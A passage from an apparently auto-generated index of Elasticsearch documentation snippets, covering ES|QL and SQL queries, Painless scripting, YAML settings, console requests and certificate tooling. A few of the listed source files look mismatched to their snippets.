text\nCODE:\n```\nGnomovision version 69, Copyright (C) year name of author Gnomovision comes\nwith ABSOLUTELY NO WARRANTY; for details type 'show w'.  This is free\nsoftware, and you are welcome to redistribute it under certain conditions;\ntype 'show c' for details.\n```\n\n----------------------------------------\n\nTITLE: Incorporating YAML Blocks with TEST Marker in Elasticsearch Docs\nDESCRIPTION: Example of incorporating a YAML block within a TEST marker for enhanced testing capabilities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/README.md#2025-04-21_snippet_7\n\nLANGUAGE: markdown\nCODE:\n```\n% TEST[s/\\n$/\\nstartyaml\\n  - compare_analyzers: {index: thai_example, first: thai, second: rebuilt_thai}\\nendyaml\\n/]\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Valid Casts in Painless\nDESCRIPTION: Examples of valid casts in Painless, including explicit numeric casts, implicit reference casts, and explicit reference casts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-casting.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\nint i = (int)5L;         \nMap m = new HashMap();   \nHashMap hm = (HashMap)m; \n```\n\n----------------------------------------\n\nTITLE: Encoding files as base64 in Unix systems\nDESCRIPTION: Command to encode a file as base64 on Unix-like systems, which is required when attaching files to JSON documents in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/attachment.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nbase64 -in myfile.rtf\n```\n\n----------------------------------------\n\nTITLE: Describing Average Function in Elasticsearch ESQL\nDESCRIPTION: This code snippet provides a description of the average function in Elasticsearch ESQL. It explains that the function calculates the average of a numeric field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/avg.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Description**\n\nThe average of a numeric field.\n```\n\n----------------------------------------\n\nTITLE: I/O Metric Example\nDESCRIPTION: This snippet provides an example of how to name a metric related to storage write I/O, using the `io` suffix.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/NAMING.md#2025-04-21_snippet_6\n\nLANGUAGE: none\nCODE:\n```\n\"es.indices.storage.write.io\"\n```\n\n----------------------------------------\n\nTITLE: Float Literal Examples\nDESCRIPTION: Demonstrates various floating-point literal notations including decimal and exponential forms with type specifiers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-literals.md#2025-04-21_snippet_3\n\nLANGUAGE: painless\nCODE:\n```\n0.0      \n1E6      \n0.977777 \n-126.34  \n89.9F    \n```\n\n----------------------------------------\n\nTITLE: Using TODAY Function in Elasticsearch SQL\nDESCRIPTION: Returns the current date when the query reaches the server. Returns same value within a query execution.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_66\n\nLANGUAGE: sql\nCODE:\n```\nSELECT TODAY() AS result;\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT first_name FROM emp WHERE hire_date > TODAY() - INTERVAL 35 YEARS ORDER BY first_name ASC LIMIT 5;\n```\n\n----------------------------------------\n\nTITLE: ESQL LIMIT Command Syntax\nDESCRIPTION: The LIMIT command syntax that specifies the maximum number of rows to return in an ESQL query result. Takes a single parameter that defines the maximum number of rows to be returned.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/limit.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nLIMIT max_number_of_rows\n```\n\n----------------------------------------\n\nTITLE: Configuring Basic Tracing Settings in Elasticsearch YAML\nDESCRIPTION: Essential YAML configuration to enable tracing and specify the APM server URL in elasticsearch.yml file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/TRACING.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ntelemetry.tracing.enabled: true\ntelemetry.agent.server_url: https://<your-apm-server>:443\n```\n\n----------------------------------------\n\nTITLE: Mixed Aggregations with Optional Filtering in ESQL\nDESCRIPTION: Shows how to mix aggregations with and without filters, and optional grouping in the STATS command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/stats-by.md#2025-04-21_snippet_5\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\nSTATS\n  avg_salary = AVG(salary) WHERE gender = \"F\",\n  min_salary = MIN(salary),\n  max_salary = MAX(salary);\n```\n\n----------------------------------------\n\nTITLE: List settings stored in the Elasticsearch keystore\nDESCRIPTION: Displays all the current secure settings stored in the keystore, prompting for a password if the keystore is password protected. Useful for auditing or verification.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/elasticsearch-keystore.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nbin/elasticsearch-keystore list\n```\n\n----------------------------------------\n\nTITLE: Painless Script for Y-Coordinate Filtering\nDESCRIPTION: This Painless script filters documents based on the Y-coordinate of a point field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_19\n\nLANGUAGE: Painless\nCODE:\n```\nInternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.eq(InternalSqlScriptUtils.stY(InternalSqlScriptUtils.geoDocValue(doc,params.v0)),params.v1))\n```\n\n----------------------------------------\n\nTITLE: Sorting on Unsigned Long Field in Elasticsearch\nDESCRIPTION: This snippet demonstrates sorting on an unsigned long field in descending order.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/unsigned-long.md#2025-04-22_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /my_index/_search\n{\n    \"query\": {\n        \"match_all\" : {}\n    },\n    \"sort\" : {\"my_counter\" : \"desc\"}\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Index Requests to Elasticsearch Bulk Request\nDESCRIPTION: Method for adding an index request to the bulk operation. Each index request represents a document to be added to Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-http-NOTICE.txt#2025-04-21_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npublic BulkRequest add(IndexRequest request) {\n    request.beforeLocalFork();\n    requests.add(request);\n    return this;\n}\n```\n\n----------------------------------------\n\nTITLE: Defining ChronoLocalDateTime Interface\nDESCRIPTION: Interface definition for ChronoLocalDateTime that represents a date-time without a time-zone in an arbitrary chronology system. Contains methods for date-time manipulation and conversion.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.chrono.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass java.time.chrono.ChronoLocalDateTime {\n  ChronoZonedDateTime atZone(ZoneId)\n  int compareTo(ChronoLocalDateTime)\n  boolean equals(Object)\n  String format(DateTimeFormatter)\n  ChronoLocalDateTime from(TemporalAccessor)\n  int hashCode()\n  boolean isAfter(ChronoLocalDateTime)\n  boolean isBefore(ChronoLocalDateTime)\n  boolean isEqual(ChronoLocalDateTime)\n  Chronology getChronology()\n  ChronoLocalDateTime minus(TemporalAmount)\n  ChronoLocalDateTime minus(long,TemporalUnit)\n  ChronoLocalDateTime plus(TemporalAmount)\n  ChronoLocalDateTime plus(long,TemporalUnit)\n  Comparator timeLineOrder()\n  long toEpochSecond(ZoneOffset)\n  Instant toInstant(ZoneOffset)\n  ChronoLocalDate toLocalDate()\n  LocalTime toLocalTime()\n  String toString()\n  ChronoLocalDateTime with(TemporalAdjuster)\n  ChronoLocalDateTime with(TemporalField,long)\n}\n```\n\n----------------------------------------\n\nTITLE: Generating Is Null in Script Query in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create a query to check for null values in a script context in Elasticsearch. It checks if the result of a comparison is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_25\n\nLANGUAGE: eql\nCODE:\n```\nprocess where null == (exit_code > -1)\n```\n\nLANGUAGE: json\nCODE:\n```\n{\"script\":{\"script\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.isNull(InternalQlScriptUtils.gt(X0,params.v1))))\",\"params\":{\"v0\":\"exit_code\",\"v1\":-1}}}}\n```\n\n----------------------------------------\n\nTITLE: Using RANDOM/RAND Function in Elasticsearch SQL\nDESCRIPTION: Returns a random double value using the provided seed. If the seed is null, the function returns null. The same seed will always produce the same random value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_23\n\nLANGUAGE: sql\nCODE:\n```\nRANDOM(seed) <1>\n```\n\n----------------------------------------\n\nTITLE: Defining Compatible Timezone Names Between PostgreSQL and Java\nDESCRIPTION: A comprehensive list of timezone identifiers that are guaranteed to work in both PostgreSQL and Java environments. The list includes geographic regions, standard abbreviations (GMT, UTC, CET), and UTC offset formats. This ensures cross-platform compatibility when handling timezone data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/expression/function/scalar/datetime/tochar-test-timezones.txt#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nUS/Samoa\nPacific/Honolulu\nPacific/Marquesas\nPacific/Gambier\nAmerica/Juneau\nCanada/Yukon\nAmerica/Vancouver\nPacific/Easter\nUS/Mountain\nAmerica/Chicago\nUS/Michigan\nAtlantic/Bermuda\nCanada/Newfoundland\nAtlantic/Cape_Verde\nPacific/Kiritimati\nPacific/Chatham\nPacific/Auckland\nAsia/Sakhalin\nAustralia/Tasmania\nAustralia/North\nAsia/Tokyo\nAustralia/Eucla\nAsia/Singapore\nAsia/Rangoon\nIndian/Chagos\nAsia/Calcutta\nAsia/Tashkent\nAsia/Tehran\nAsia/Dubai\nAfrica/Nairobi\nEurope/Brussels\nEurope/Vienna\nEurope/London\nEtc/GMT+12\nGMT\nUTC\nCET\n+11:00\n+04:30\n+01:00\n+00:00\n-00:00\n-01:15\n-02:00\n-11:00\n```\n\n----------------------------------------\n\nTITLE: Calculating Hyperbolic Cosine with COSH Function in ESQL\nDESCRIPTION: This snippet demonstrates how to use the COSH function in ESQL to calculate the hyperbolic cosine of a numeric value. It creates a row with a double value and then applies the COSH function to compute the hyperbolic cosine of that value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/cosh.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=1.8\n| EVAL cosh=COSH(a)\n```\n\n----------------------------------------\n\nTITLE: Retrieving Euler's Number in ESQL\nDESCRIPTION: This function returns Euler's number (e), a mathematical constant approximately equal to 2.71828. It takes no parameters and returns a single row containing the value of e.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/e.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW E()\n```\n\n----------------------------------------\n\nTITLE: Logging delete_user Event in Elasticsearch\nDESCRIPTION: Example of an audit log for the delete user event. This event is logged when the delete user API is invoked to delete a specific native user from the system.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\n{\"type\":\"audit\", \"timestamp\":\"2020-12-30T22:19:41,345+0200\", \"node.id\":\n\"0RMNyghkQYCc_gVd1G6tZQ\", \"event.type\":\"security_config_change\",\n\"event.action\":\"delete_user\", \"request.id\":\"au5a1Cc3RrebDMitMGGNCw\",\n\"delete\":{\"user\":{\"name\":\"jacknich\"}}}\n```\n\n----------------------------------------\n\nTITLE: kNN Retriever Results for Vector Search in Elasticsearch\nDESCRIPTION: The ranked results from the kNN retriever showing document IDs and scores based on vector similarity, before RRF ranking is applied.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion.md#2025-04-21_snippet_7\n\nLANGUAGE: console-result\nCODE:\n```\n\"hits\" : [\n    {\n        \"_index\" : \"example-index\",\n        \"_id\" : \"3\",                   <1>\n        \"_score\" : 1.0,\n        \"_source\" : {\n            \"integer\" : 1,\n            \"vector\" : [3],\n            \"text\" : \"rrf rrf rrf\"\n        }\n    },\n    {\n        \"_index\" : \"example-index\",\n        \"_id\" : \"2\",                   <2>\n        \"_score\" : 0.5,\n        \"_source\" : {\n            \"integer\" : 2,\n            \"vector\" : [4],\n            \"text\" : \"rrf rrf\"\n        }\n    },\n    {\n        \"_index\" : \"example-index\",\n        \"_id\" : \"1\",                   <3>\n        \"_score\" : 0.2,\n        \"_source\" : {\n            \"integer\" : 1,\n            \"vector\" : [5],\n            \"text\" : \"rrf\"\n        }\n    },\n    {\n        \"_index\" : \"example-index\",\n        \"_id\" : \"5\",                   <4>\n        \"_score\" : 0.1,\n        \"_source\" : {\n            \"integer\" : 1,\n            \"vector\" : [0]\n        }\n    }\n]\n```\n\n----------------------------------------\n\nTITLE: Processed Document After Pipeline Execution in Elasticsearch\nDESCRIPTION: Displays the final indexed document after both pipelines have processed it. The document contains the original field plus the fields added by both the inner and outer pipelines.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/pipeline-processor.md#2025-04-21_snippet_5\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"field\": \"value\",\n  \"inner_pipeline_set\": \"inner\",\n  \"outer_pipeline_set\": \"outer\"\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Data Type Comparison Matrix\nDESCRIPTION: Markdown table showing supported data type combinations for comparison operations. Shows left-hand side (lhs) types, right-hand side (rhs) types, and their resulting boolean output type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/less_than_or_equal.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| lhs | rhs | result |\n| --- | --- | --- |\n| date | date | boolean |\n| date | date_nanos | boolean |\n| date_nanos | date | boolean |\n| date_nanos | date_nanos | boolean |\n| double | double | boolean |\n| double | integer | boolean |\n| double | long | boolean |\n| integer | double | boolean |\n| integer | integer | boolean |\n| integer | long | boolean |\n| ip | ip | boolean |\n| keyword | keyword | boolean |\n| keyword | text | boolean |\n| long | double | boolean |\n| long | integer | boolean |\n| long | long | boolean |\n| text | keyword | boolean |\n| text | text | boolean |\n| unsigned_long | unsigned_long | boolean |\n| version | version | boolean |\n```\n\n----------------------------------------\n\nTITLE: Configuring Kuromoji Readingform Analyzers in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to set up custom analyzers using the kuromoji_readingform filter with different configurations for romaji and katakana output. It creates an index with two analyzers and their respective filter settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-readingform.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT kuromoji_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"romaji_analyzer\": {\n            \"tokenizer\": \"kuromoji_tokenizer\",\n            \"filter\": [ \"romaji_readingform\" ]\n          },\n          \"katakana_analyzer\": {\n            \"tokenizer\": \"kuromoji_tokenizer\",\n            \"filter\": [ \"katakana_readingform\" ]\n          }\n        },\n        \"filter\": {\n          \"romaji_readingform\": {\n            \"type\": \"kuromoji_readingform\",\n            \"use_romaji\": true\n          },\n          \"katakana_readingform\": {\n            \"type\": \"kuromoji_readingform\",\n            \"use_romaji\": false\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Bitwise NOT with 'def' Type in Painless\nDESCRIPTION: Demonstrates the bitwise NOT operator ('~') in Painless when used with the 'def' type. The 'def' type automatically casts values, so the bitwise NOT operation is performed on the integer representation of the 'def' value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_13\n\nLANGUAGE: painless\nCODE:\n```\ndef d = 1;  <1>\ndef e = ~d; <2>\n```\n\n----------------------------------------\n\nTITLE: Converting JKS Keystore to PKCS12\nDESCRIPTION: Converts a JKS keystore containing multiple entries to a PKCS12 keystore format. Useful for interoperability with systems requiring PKCS12.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/identity-provider/src/test/resources/org/elasticsearch/xpack/idp/saml/idp/README.txt#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nkeytool -importkeystore -srckeystore multi_signing.jks  -destkeystore multi_signing.p12 -deststoretype PKCS12 -deststorepass signing -destkeypass signing\n```\n\n----------------------------------------\n\nTITLE: Defining Elasticsearch Certutil Function\nDESCRIPTION: Creates a function wrapper for the elasticsearch-certutil tool located in the Elasticsearch bin directory.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/src/test/resources/org/elasticsearch/xpack/ssl/SSLErrorMessageTests/README.txt#2025-04-21_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nfunction certutil() { \"$ES_HOME/bin/elasticsearch-certutil\" \"$@\"; }\n```\n\n----------------------------------------\n\nTITLE: Calculating Median Absolute Deviation in ESQL\nDESCRIPTION: This snippet describes the median absolute deviation function in ESQL. It converts a multivalued field into a single value representing the median absolute deviation. The calculation involves finding the median of the deviations from the median of the entire sample.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/mv_median_absolute_deviation.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Description**\n\nConverts a multivalued field into a single valued field containing the median absolute deviation.  It is calculated as the median of each data point's deviation from the median of the entire sample. That is, for a random variable `X`, the median absolute deviation is `median(|median(X) - X|)`.\n\n::::{note}\nIf the field has an even number of values, the medians will be calculated as the average of the middle two values. If the value is not a floating point number, the averages are rounded towards 0.\n::::\n```\n\n----------------------------------------\n\nTITLE: Generating Self-Signed Certificates for Elasticsearch with PEM Format\nDESCRIPTION: This script creates a self-signed certificate using elasticsearch-certutil, extracts the certificate files from the resulting zip, and performs cleanup. It generates a signing key with a 9999-day validity period and 2048-bit keysize.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/qa/saml-rest-tests/src/javaRestTest/resources/saml/README.txt#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nelasticsearch-certutil cert --self-signed --pem --out ${PWD}/signing.zip -days 9999 -keysize 2048 -name \"signing\"\nunzip signing.zip\nmv signing/signing.* ./\nrmdir signing\nrm signing.zip\n```\n\n----------------------------------------\n\nTITLE: Debug Response for Goals Field\nDESCRIPTION: Shows the response from Debug.explain revealing the internal class type of the goals field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-debugging.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\n{\n   \"error\": {\n      \"type\": \"script_exception\",\n      \"to_string\": \"[1, 9, 27]\",\n      \"painless_class\": \"org.elasticsearch.index.fielddata.ScriptDocValues.Longs\",\n      \"java_class\": \"org.elasticsearch.index.fielddata.ScriptDocValues$Longs\",\n      ...\n   },\n   \"status\": 400\n}\n```\n\n----------------------------------------\n\nTITLE: Sample Document with Array of Objects\nDESCRIPTION: Example document containing an array of person objects with id and name fields to be processed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/foreach-processor.md#2025-04-21_snippet_3\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"persons\" : [\n    {\n      \"id\" : \"1\",\n      \"name\" : \"John Doe\"\n    },\n    {\n      \"id\" : \"2\",\n      \"name\" : \"Jane Doe\"\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing IP Address Utility Class\nDESCRIPTION: Defines an IP address utility class with methods to check IP version and create IP address instances from strings\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.net.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nclass org.elasticsearch.script.field.IPAddress {\n    (String)\n    boolean isV4()\n    boolean isV6()\n}\n```\n\n----------------------------------------\n\nTITLE: Unsupported TIME in HISTOGRAM Function\nDESCRIPTION: Example of an unsupported SQL query that attempts to use TIME data type in the HISTOGRAM grouping function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-limitations.md#2025-04-21_snippet_10\n\nLANGUAGE: sql\nCODE:\n```\nSELECT HISTOGRAM(CAST(birth_date AS TIME), INTERVAL '10' MINUTES) as h, COUNT(*) FROM t GROUP BY h\n```\n\n----------------------------------------\n\nTITLE: MongoDB Aggregation Pipeline Sync Rule Structure\nDESCRIPTION: JSON structure demonstrating the format for defining MongoDB aggregation pipeline sync rules\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-mongodb.md#2025-04-21_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\n{\n\t\"aggregate\":{\n\t\t\"pipeline\": [\n\t\t\t// pipeline elements go here\n\t\t],\n\t\t\"options\": {\n            // pipeline options go here\n\t\t}\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: GeoPoint Field Script Class Declaration\nDESCRIPTION: Declares the GeoPointFieldScript class as whitelisted for painless scripting with no import required.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.geo_point_field.txt#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\nclass org.elasticsearch.script.GeoPointFieldScript @no_import {}\n```\n\n----------------------------------------\n\nTITLE: Verifying Data in Elasticsearch Music Index\nDESCRIPTION: Performs queries to verify data presence and structure in the `music` index after a sync job.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_18\n\nLANGUAGE: console\nCODE:\n```\nGET music/_count\nGET music/_search\n```\n\n----------------------------------------\n\nTITLE: Formatting to ISO 8601\nDESCRIPTION: Demonstrates formatting a ZonedDateTime to ISO 8601 string format using built-in formatter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_4\n\nLANGUAGE: painless\nCODE:\n```\nZonedDateTime zdt =\n        ZonedDateTime.of(1983, 10, 13, 22, 15, 30, 0, ZoneId.of('Z'));\nString datetime = zdt.format(DateTimeFormatter.ISO_INSTANT);\n```\n\n----------------------------------------\n\nTITLE: Deprecated Transform Enable Setting\nDESCRIPTION: Static setting from version 7.8.0 that is now deprecated and no longer has any effect on transform functionality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/transforms-settings.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.transform.enabled\n```\n\n----------------------------------------\n\nTITLE: INTERSECTION Operator Examples\nDESCRIPTION: Examples showing the ampersand operator which acts as an AND operator, available when the INTERSECTION flag is enabled.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/regexp-syntax.md#2025-04-21_snippet_16\n\nLANGUAGE: text\nCODE:\n```\naaa.+&.+bbb  # matches 'aaabbb'\n```\n\n----------------------------------------\n\nTITLE: Copyright Disclaimer Template\nDESCRIPTION: Sample template for a copyright disclaimer statement to be signed by employers or institutions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/licenses/jakarta.mail-LICENSE.txt#2025-04-21_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nYoyodyne, Inc., hereby disclaims all copyright interest in the\nprogram `Gnomovision' (which makes passes at compilers) written by\nJames Hacker.\n\nsignature of Ty Coon, 1 April 1989\nTy Coon, President of Vice\n```\n\n----------------------------------------\n\nTITLE: Thread Management Entitlement Example\nDESCRIPTION: Example of configuring the manage_threads entitlement for a specific module or non-modular plugin.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/creating-classic-plugins.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\norg.example.module: # or 'ALL-UNNAMED' if the plugin is non-modular\n  - manage_threads\n```\n\n----------------------------------------\n\nTITLE: IndexMetadata Forecasted Write Load Access\nDESCRIPTION: Recommends using WriteLoadForecaster#getForecastedWriteLoad instead of directly accessing IndexMetadata#getForecastedWriteLoad().\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-all-signatures.txt#2025-04-21_snippet_9\n\nLANGUAGE: java\nCODE:\n```\n@defaultMessage Use WriteLoadForecaster#getForecastedWriteLoad instead\norg.elasticsearch.cluster.metadata.IndexMetadata#getForecastedWriteLoad()\n```\n\n----------------------------------------\n\nTITLE: Synonym Dictionary Bundle Structure Example\nDESCRIPTION: Example directory structure for a synonym dictionary bundle showing the placement of synonyms.txt in the dictionaries folder.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-custom-bundles.md#2025-04-21_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n$ tree .\n.\n└── dictionaries\n    └── synonyms.txt\n```\n\n----------------------------------------\n\nTITLE: Keyed Response IP Prefix Aggregation\nDESCRIPTION: Demonstrates IP prefix aggregation with keyed response format for better bucket identification.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-ipprefix-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /network-traffic/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"ipv4-subnets\": {\n      \"ip_prefix\": {\n        \"field\": \"ipv4\",\n        \"prefix_length\": 24,\n        \"keyed\": true\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Assigning Variables in Painless\nDESCRIPTION: Examples of variable assignment in Painless, including immediate assignment, assignment between variables, and working with reference types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-variables.md#2025-04-21_snippet_1\n\nLANGUAGE: painless\nCODE:\n```\nint i;\ni = 10;\n```\n\nLANGUAGE: painless\nCODE:\n```\nint i = 10;\ndouble j = 2.0;\n```\n\nLANGUAGE: painless\nCODE:\n```\nint i = 10;\nint j = i;\n```\n\nLANGUAGE: painless\nCODE:\n```\nArrayList l = new ArrayList();\nMap m = new HashMap();\n```\n\nLANGUAGE: painless\nCODE:\n```\nList l = new ArrayList();\nList k = l;\nList m;\nm = k;\n```\n\n----------------------------------------\n\nTITLE: Counting Rows with COUNT Function in ESQL\nDESCRIPTION: This snippet demonstrates how to count the number of non-null values in a specific column using the COUNT function in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/count.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS COUNT(height)\n```\n\n----------------------------------------\n\nTITLE: Native Libraries Entitlement Example\nDESCRIPTION: Example of configuring permissions for loading native libraries and accessing restricted methods.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/creating-classic-plugins.md#2025-04-21_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\norg.example.module: # or 'ALL-UNNAMED' if the plugin is non-modular\n  - load_native_libraries\n```\n\n----------------------------------------\n\nTITLE: Unsupported Complex Ordering with Aggregations\nDESCRIPTION: Examples of unsupported SQL queries that use scalar functions or complex expressions with aggregations in the ORDER BY clause.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-limitations.md#2025-04-21_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\nSELECT age, ROUND(AVG(salary)) AS avg FROM test GROUP BY age ORDER BY avg;\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT age, MAX(salary) - MIN(salary) AS diff FROM test GROUP BY age ORDER BY diff;\n```\n\n----------------------------------------\n\nTITLE: Copyright Disclaimer Template\nDESCRIPTION: Sample template for a copyright disclaimer statement to be signed by employers or institutions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-html-module-NOTICE.txt#2025-04-21_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nYoyodyne, Inc., hereby disclaims all copyright interest in the\nprogram `Gnomovision' (which makes passes at compilers) written by\nJames Hacker.\n\nsignature of Ty Coon, 1 April 1989\nTy Coon, President of Vice\n```\n\n----------------------------------------\n\nTITLE: Defining KEEP Command Syntax in Elasticsearch SQL\nDESCRIPTION: Specifies the basic syntax for the KEEP command, which is used to select and order columns in the output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/keep.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nKEEP columns\n```\n\n----------------------------------------\n\nTITLE: Using _only_nodes Preference Parameter in Elasticsearch\nDESCRIPTION: Demonstrates the _only_nodes preference parameter which restricts search operations to specific nodes identified by their node IDs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/licenses/slf4j-api-NOTICE.txt#2025-04-21_snippet_2\n\nLANGUAGE: text\nCODE:\n```\npreference=_only_nodes:abc,xyz\n```\n\n----------------------------------------\n\nTITLE: Defining 